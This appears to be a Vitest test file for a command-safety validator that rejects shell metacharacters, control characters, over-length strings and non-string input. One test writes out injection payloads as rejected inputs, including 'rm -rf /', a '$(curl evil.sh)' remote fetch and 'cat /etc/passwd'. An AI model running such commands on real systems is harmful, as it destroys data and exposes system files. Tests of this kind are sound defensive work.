import { describe, it, expect } from 'vitest';
import { validateCommandSafety } from '../../src/utils/command.js';

describe('validateCommandSafety', () => {
  it('accepts ordinary commands', () => {
    expect(validateCommandSafety('codegraph')).toBe(true);
    expect(validateCommandSafety('/usr/local/bin/codegraph serve --mcp')).toBe(true);
    expect(validateCommandSafety('npx -y doc-relay mcp')).toBe(true);
  });

  it('rejects every shell metacharacter', () => {
    for (const meta of [';', '&', '|', '`', '$', '(', ')', '<', '>', '!']) {
      expect(validateCommandSafety(`cmd ${meta} arg`), `metacharacter ${meta}`).toBe(false);
    }
  });

  it('rejects injection payloads', () => {
    expect(validateCommandSafety('codegraph; rm -rf /')).toBe(false);
    expect(validateCommandSafety('$(curl evil.sh)')).toBe(false);
    expect(validateCommandSafety('codegraph && cat /etc/passwd')).toBe(false);
    expect(validateCommandSafety('codegraph | tee /tmp/x')).toBe(false);
  });

  it('rejects ASCII control characters including DEL', () => {
    expect(validateCommandSafety('cmd\narg')).toBe(false);
    expect(validateCommandSafety('cmd\tsomething')).toBe(false);
    expect(validateCommandSafety('cmd\x00arg')).toBe(false);
    expect(validateCommandSafety('cmd\x7farg')).toBe(false);
  });

  it('rejects over-length commands', () => {
    expect(validateCommandSafety('x'.repeat(1025))).toBe(false);
    expect(validateCommandSafety('x'.repeat(1024))).toBe(true);
  });

  it('honors a custom maxLength', () => {
    expect(validateCommandSafety('x'.repeat(257), 256)).toBe(false);
    expect(validateCommandSafety('x'.repeat(256), 256)).toBe(true);
  });

  it('rejects non-string input', () => {
    // @ts-expect-error — runtime defense against non-string callers
    expect(validateCommandSafety(null)).toBe(false);
    // @ts-expect-error — runtime defense against non-string callers
    expect(validateCommandSafety(undefined)).toBe(false);
    // @ts-expect-error — runtime defense against non-string callers
    expect(validateCommandSafety(42)).toBe(false);
  });
});
